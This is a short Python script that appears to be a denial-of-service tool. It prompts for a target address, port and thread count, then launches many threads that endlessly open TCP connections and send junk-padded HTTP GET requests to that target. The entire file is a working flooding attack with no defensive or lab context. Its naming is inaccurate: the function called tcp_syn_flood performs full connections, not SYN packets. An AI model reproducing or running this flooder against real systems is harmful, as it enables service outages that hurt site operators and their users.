import threading
import socket
import random

data = str(random._urandom(2450))
message = "this is dos attack test"
requests_sent = 0

victim_address = str(input("Please enter a resource, u wanna send http get flood to: "))

# get port
def get_port():
    try:
        victim_port = int(input("Please enter a port: "))
        return victim_port

    except Exception:
        print("must be an integer not empty, set to default 80")
        return 80

def get_thread():
    try:
        threads = int(input("Please enter amount of threads: "))
        return threads

    except Exception:
        print("Something went wrong, set to default value 100 ")
        return 100


ip = socket.gethostbyname(victim_address)

# getting user input
port = get_port()
threads = get_thread()

def tcp_syn_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        # crafted packet
        packet = str("GET / HTTP/1.1\nHost: "+ip+"\n\n User-Agent: "+"HELLO"+"\r\nConnection: "+"keep-alive\r\n"+data).encode('utf-8')
        s.sendto(packet, (ip, int(port)))
        s.close()

        global requests_sent
        requests_sent += 1
        if requests_sent % 1000 == 0:
            print(f"{requests_sent} requests are sent..")

for i in range(threads):
    thread = threading.Thread(target=tcp_syn_flood)
    thread.start()